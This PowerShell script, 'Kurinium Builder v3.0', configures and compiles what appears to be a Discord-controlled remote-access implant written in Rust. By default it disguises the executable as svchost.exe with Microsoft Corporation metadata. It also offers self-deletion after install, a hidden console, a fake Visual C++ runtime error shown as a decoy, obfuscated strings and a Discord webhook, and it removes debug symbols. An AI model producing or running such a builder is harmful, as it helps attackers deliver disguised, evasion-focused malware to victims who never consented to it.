$Host.UI.RawUI.WindowTitle = "Kurinium Builder"

$presetsDir = Join-Path $PSScriptRoot "presets"
if (-not (Test-Path $presetsDir)) {
    New-Item -ItemType Directory -Path $presetsDir -Force | Out-Null
}

function Save-Preset {
    param($name, $config)
    $presetPath = Join-Path $presetsDir "$name.json"
    $config | ConvertTo-Json -Depth 10 | Set-Content $presetPath
    Write-Host "Preset '$name' saved!" -ForegroundColor Green
}

function Get-Presets {
    $presetFiles = Get-ChildItem -Path $presetsDir -Filter "*.json" -ErrorAction SilentlyContinue
    return $presetFiles | ForEach-Object { $_.BaseName }
}

function Load-Preset {
    param($name)
    $presetPath = Join-Path $presetsDir "$name.json"
    if (Test-Path $presetPath) {
        return Get-Content $presetPath | ConvertFrom-Json
    }
    return $null
}

function XOR-Encrypt {
    param($text, $key)
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)
    $textBytes = [System.Text.Encoding]::UTF8.GetBytes($text)
    $result = @()
    for ($i = 0; $i -lt $textBytes.Length; $i++) {
        $result += $textBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
    }
    return $result
}

function Format-EncryptedBytes {
    param($bytes)
    $formatted = ($bytes | ForEach-Object { "0x{0:x2}" -f $_ }) -join ", "
    return "enc![$formatted]"
}

function Test-Environment {
    Write-Host "[WAIT] Checking environment..." -ForegroundColor Yellow
    
    # Check Rust
    if (-not (Get-Command cargo -ErrorAction SilentlyContinue)) {
        Write-Host "[FAIL] Rust/Cargo not found! Please install Rust." -ForegroundColor Red
        exit 1
    }
    
    # Check Target
    $targets = rustup target list --installed
    if (-not ($targets -contains "x86_64-pc-windows-msvc")) {
        Write-Host "[WARN] Target x86_64-pc-windows-msvc not found. Installing..." -ForegroundColor Yellow
        rustup target add x86_64-pc-windows-msvc
    }
    
    Write-Host "[OK] Environment ready." -ForegroundColor Green
    Write-Host ""
}

function Test-DiscordToken {
    param($token)
    try {
        $headers = @{ "Authorization" = "Bot $token" }
        $response = Invoke-RestMethod -Uri "https://discord.com/api/v10/users/@me" -Headers $headers -ErrorAction Stop
        Write-Host "    [SUCCESS] Token Validated: $($response.username)#$($response.discriminator) (ID: $($response.id))" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "    [ERROR] Invalid Token: $($_.Exception.Message)" -ForegroundColor Red
        if ($_.Exception.Response) {
             # Write-Host "    Response: $($_.Exception.Response.StatusCode)" -ForegroundColor Red
        }
        return $false
    }
}

function Validate-Inputs {
    param($config)
    
    Write-Host "Verifying inputs..." -ForegroundColor Yellow

    # Validate Discord Token (Online Check)
    if (-not (Test-DiscordToken -token $config.token)) {
        Write-Host "[FAIL] Token validation failed! Please check your token." -ForegroundColor Red
        exit 1
    }
    
    # Validate Guild ID
    if ($config.guildId -match "\D") {
        Write-Host "[FAIL] Guild ID must be numeric!" -ForegroundColor Red
        exit 1
    }
}

Clear-Host
Test-Environment

Write-Host ""
Write-Host "========================================" -ForegroundColor Red
Write-Host "        KURINIUM BUILDER v3.0          " -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Red
Write-Host ""

$XOR_KEY = "K0r1n!uM_2o24_S3cR3t_K3y!@#`$"
$loadedFromPreset = $false
$config = @{
    # Required
    token = ""
    guildId = ""
    
    # Build Info
    fileName = "svchost.exe"
    productName = "Windows Service Host"
    description = "Host Process for Windows Services"
    companyName = "Microsoft Corporation"
    fileVersion = "10.0.19041.1"
    
    # Features
    autoDelete = $true
    showConsole = $false
    
    # Decoy Message
    decoyEnabled = $false
    decoyTitle = "Microsoft Visual C++ Runtime Library"
    decoyMessage = "Runtime Error!`n`nProgram: C:\Windows\System32\svchost.exe`n`nR6025`n- pure virtual function call"
    
    # Webhook Backup
    webhookEnabled = $false
    webhookUrl = ""
}

# Check for existing presets
$existingPresets = Get-Presets
if ($existingPresets) {
    Write-Host "[PRESETS]" -ForegroundColor Magenta
    Write-Host "    Available: $($existingPresets -join ', ')" -ForegroundColor Gray
    $loadPreset = Read-Host "    Load preset? (name or Enter to skip)"
    
    if ($loadPreset -and ($existingPresets -contains $loadPreset)) {
        $loaded = Load-Preset $loadPreset
        # Convert PSObject to hashtable
        $loaded.PSObject.Properties | ForEach-Object { $config[$_.Name] = $_.Value }
        Write-Host "    Preset '$loadPreset' loaded!" -ForegroundColor Green
        $loadedFromPreset = $true
    }
    Write-Host ""
}

if (-not $loadedFromPreset) {
    Write-Host "========================================" -ForegroundColor Yellow
    Write-Host "         REQUIRED SETTINGS             " -ForegroundColor Yellow
    Write-Host "========================================" -ForegroundColor Yellow
    Write-Host ""

    Write-Host "[1] DISCORD BOT TOKEN" -ForegroundColor Yellow
    Write-Host "    https://discord.com/developers/applications" -ForegroundColor Gray
    $config.token = Read-Host "    Token"
    if ([string]::IsNullOrWhiteSpace($config.token)) {
        Write-Host "ERROR: Token cannot be empty!" -ForegroundColor Red
        exit 1
    }

    Write-Host ""
    Write-Host "[2] DISCORD GUILD ID" -ForegroundColor Yellow
    Write-Host "    Right-click server -> Copy Server ID" -ForegroundColor Gray
    $config.guildId = Read-Host "    Guild ID"
    if ([string]::IsNullOrWhiteSpace($config.guildId)) {
        Write-Host "ERROR: Guild ID cannot be empty!" -ForegroundColor Red
        exit 1
    }

    Write-Host ""
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "         BUILD INFO (EXE PROPS)        " -ForegroundColor Cyan
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host ""

    Write-Host "[3] FILE NAME (Internal)" -ForegroundColor Yellow
    Write-Host "    Shown in Task Manager (default: $($config.fileName))" -ForegroundColor Gray
    $input = Read-Host "    File Name"
    if ($input) { $config.fileName = $input }

    Write-Host ""
    Write-Host "[4] PRODUCT NAME" -ForegroundColor Yellow
    Write-Host "    EXE Properties (default: $($config.productName))" -ForegroundColor Gray
    $input = Read-Host "    Product Name"
    if ($input) { $config.productName = $input }

    Write-Host ""
    Write-Host "[5] DESCRIPTION" -ForegroundColor Yellow
    Write-Host "    EXE Properties (default: $($config.description))" -ForegroundColor Gray
    $input = Read-Host "    Description"
    if ($input) { $config.description = $input }

    Write-Host ""
    Write-Host "[6] COMPANY NAME" -ForegroundColor Yellow
    Write-Host "    EXE Properties (default: $($config.companyName))" -ForegroundColor Gray
    $input = Read-Host "    Company Name"
    if ($input) { $config.companyName = $input }

    Write-Host ""
    Write-Host "[7] FILE VERSION" -ForegroundColor Yellow
    Write-Host "    EXE Properties (default: $($config.fileVersion))" -ForegroundColor Gray
    $input = Read-Host "    File Version"
    if ($input) { $config.fileVersion = $input }

    Write-Host ""
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "         OPTIONAL FEATURES             " -ForegroundColor Cyan
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host ""

    Write-Host "[8] AUTO-DELETE ORIGINAL" -ForegroundColor Yellow
    Write-Host "    Delete original exe after installation" -ForegroundColor Gray
    $input = Read-Host "    Enable auto-delete? (Y/n)"
    $config.autoDelete = -not ($input -eq 'n' -or $input -eq 'N')

    Write-Host ""
    Write-Host "[9] DEBUG LOGGING" -ForegroundColor Yellow
    Write-Host "    Writes logs to debug.log next to exe" -ForegroundColor Gray
    $input = Read-Host "    Enable debug logging? (y/N)"
    $config.showConsole = ($input -eq 'y' -or $input -eq 'Y')

    Write-Host ""
    Write-Host "[10] DECOY MESSAGE" -ForegroundColor Yellow
    Write-Host "    Shows fake error on first run" -ForegroundColor Gray
    $input = Read-Host "    Enable decoy message? (y/N)"
    $config.decoyEnabled = ($input -eq 'y' -or $input -eq 'Y')

    if ($config.decoyEnabled) {
        Write-Host "    Title (default: $($config.decoyTitle))" -ForegroundColor Gray
        $input = Read-Host "    Decoy Title"
        if ($input) { $config.decoyTitle = $input }

        Write-Host "    Message (use \n for newlines)" -ForegroundColor Gray
        $input = Read-Host "    Decoy Message"
        if ($input) { $config.decoyMessage = $input -replace "\\n", "`n" }
    }

    Write-Host ""
    Write-Host "[11] WEBHOOK BACKUP (Error Reporting)" -ForegroundColor Yellow
    Write-Host "    Sends error logs to webhook when bot crashes" -ForegroundColor Gray
    $input = Read-Host "    Enable webhook backup? (y/N)"
    $config.webhookEnabled = ($input -eq 'y' -or $input -eq 'Y')

    if ($config.webhookEnabled) {
        Write-Host "    Discord Webhook URL:" -ForegroundColor Gray
        $config.webhookUrl = Read-Host "    Webhook URL"
        if ([string]::IsNullOrWhiteSpace($config.webhookUrl)) {
            Write-Host "    WARNING: Empty webhook URL, disabling backup" -ForegroundColor Yellow
            $config.webhookEnabled = $false
        }
    }

    # Save preset option
    Write-Host ""
    Write-Host "========================================" -ForegroundColor Magenta
    Write-Host "[SAVE PRESET]" -ForegroundColor Magenta
    $savePresetName = Read-Host "    Save as preset? (name or Enter to skip)"
    if ($savePresetName) {
        Save-Preset $savePresetName $config
    }
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Red
Write-Host "         APPLYING CONFIGURATION        " -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Red
Write-Host ""

# Update config.rs with encrypted strings
$configPath = Join-Path $PSScriptRoot "src\config.rs"
$configContent = Get-Content $configPath -Raw

# Helper for strict Rust string escaping
function Escape-ForRust {
    param($str)
    if (-not $str) { return "" }
    return $str.Replace("\", "\\").Replace("`"", "\`"")
}

# Update encrypted_strings functions using regex patterns - injecting raw strings for compile-time obfuscation
# file_name
$safeFileName = Escape-ForRust $config.fileName
$configContent = $configContent -replace '(pub fn file_name\(\) -> String \{\s*obfstr::obfstr!\(")[^"]+("\)\.to_string\(\))', "`${1}$safeFileName`${2}"

# product_name
$safeProductName = Escape-ForRust $config.productName
$configContent = $configContent -replace '(pub fn product_name\(\) -> String \{\s*obfstr::obfstr!\(")[^"]+("\)\.to_string\(\))', "`${1}$safeProductName`${2}"

# description
$safeDescription = Escape-ForRust $config.description
$configContent = $configContent -replace '(pub fn description\(\) -> String \{\s*obfstr::obfstr!\(")[^"]+("\)\.to_string\(\))', "`${1}$safeDescription`${2}"

# company_name
$safeCompanyName = Escape-ForRust $config.companyName
$configContent = $configContent -replace '(pub fn company_name\(\) -> String \{\s*obfstr::obfstr!\(")[^"]+("\)\.to_string\(\))', "`${1}$safeCompanyName`${2}"

# file_version
$safeVersion = Escape-ForRust $config.fileVersion
$configContent = $configContent -replace '(pub fn file_version\(\) -> String \{\s*obfstr::obfstr!\(")[^"]+("\)\.to_string\(\))', "`${1}$safeVersion`${2}"

$decoyTitleSafe = Escape-ForRust $config.decoyTitle

$decoyMessagePre = Escape-ForRust $config.decoyMessage
$decoyMessageSafe = $decoyMessagePre -replace "`r`n", "\n" -replace "`n", "\n"

$configContent = $configContent -replace '(pub fn decoy_title\(\) -> String \{\s*obfstr::obfstr!\(")[^"]+("\)\.to_string\(\))', "`${1}$decoyTitleSafe`${2}"
$configContent = $configContent -replace '(pub fn decoy_message\(\) -> String \{\s*obfstr::obfstr!\(")[^"]+("\)\.to_string\(\))', "`${1}$decoyMessageSafe`${2}"

# Update autodelete config
$autoDeleteEnabled = if ($config.autoDelete) { "true" } else { "false" }
$configContent = $configContent -replace '(pub fn get_autodelete_config\(\) -> AutoDeleteConfig \{\s*AutoDeleteConfig \{\s*enabled: )(true|false)', "`$1$autoDeleteEnabled"

# Update decoy config
$decoyEnabled = if ($config.decoyEnabled) { "true" } else { "false" }
$configContent = $configContent -replace '(pub fn get_decoy_config\(\) -> DecoyConfig \{\s*DecoyConfig \{\s*enabled: )(true|false)', "`$1$decoyEnabled"

# Update webhook URL
if ($config.webhookEnabled -and $config.webhookUrl) {
    $safeWebhookUrl = Escape-ForRust $config.webhookUrl
    $configContent = $configContent -replace '(pub fn webhook_url\(\) -> String \{\s*obfstr::obfstr!\(")[^"]*("\)\.to_string\(\))', "`${1}$safeWebhookUrl`${2}"
}

Set-Content $configPath -Value $configContent -NoNewline

Write-Host "Configuration Summary:" -ForegroundColor Green
Write-Host "  Guild ID: $($config.guildId)" -ForegroundColor Gray
Write-Host "  File Name: $($config.fileName)" -ForegroundColor Gray
Write-Host "  Product Name: $($config.productName)" -ForegroundColor Gray
Write-Host "  Description: $($config.description)" -ForegroundColor Gray
Write-Host "  Company: $($config.companyName)" -ForegroundColor Gray
Write-Host "  Version: $($config.fileVersion)" -ForegroundColor Gray
Write-Host "  Auto-Delete: $($config.autoDelete)" -ForegroundColor Gray
Write-Host "  Debug Logging: $($config.showConsole)" -ForegroundColor Gray
Write-Host "  Decoy Message: $($config.decoyEnabled)" -ForegroundColor Gray
Write-Host "  Webhook Backup: $($config.webhookEnabled)" -ForegroundColor Gray
Write-Host ""

Write-Host "========================================" -ForegroundColor Red
Write-Host "            BUILDING RELEASE           " -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Red
Write-Host ""

Validate-Inputs $config

$env:KURINIUM_TOKEN = $config.token
Set-Location $PSScriptRoot
cargo build --release

if ($LASTEXITCODE -eq 0) {
    $distDir = Join-Path $PSScriptRoot "dist"
    if (-not (Test-Path $distDir)) {
        New-Item -ItemType Directory -Path $distDir -Force | Out-Null
    }

    $targetPath = Join-Path $PSScriptRoot "target\release\kurinium.exe"
    $finalName = if ($config.fileName.EndsWith(".exe")) { $config.fileName } else { "$($config.fileName).exe" }
    $finalPath = Join-Path $distDir $finalName
    $pdbPath = Join-Path $PSScriptRoot "target\release\kurinium.pdb"

    Copy-Item -Path $targetPath -Destination $finalPath -Force
    if (Test-Path $pdbPath) { Remove-Item $pdbPath -Force }

    $hash = Get-FileHash -Path $finalPath -Algorithm SHA256
    $checksumPath = Join-Path $distDir "checksums.txt"
    "$($hash.Hash)  $finalName" | Set-Content $checksumPath

    Write-Host ""
    Write-Host "========================================" -ForegroundColor Green
    Write-Host "          BUILD SUCCESSFUL!            " -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Green
    Write-Host ""
    Write-Host " [Artifact] $finalPath" -ForegroundColor Yellow
    Write-Host " [Checksum] $checksumPath" -ForegroundColor Gray
    Write-Host ""

    Invoke-Item $distDir
} else {
    Write-Host ""
    Write-Host "BUILD FAILED!" -ForegroundColor Red
}
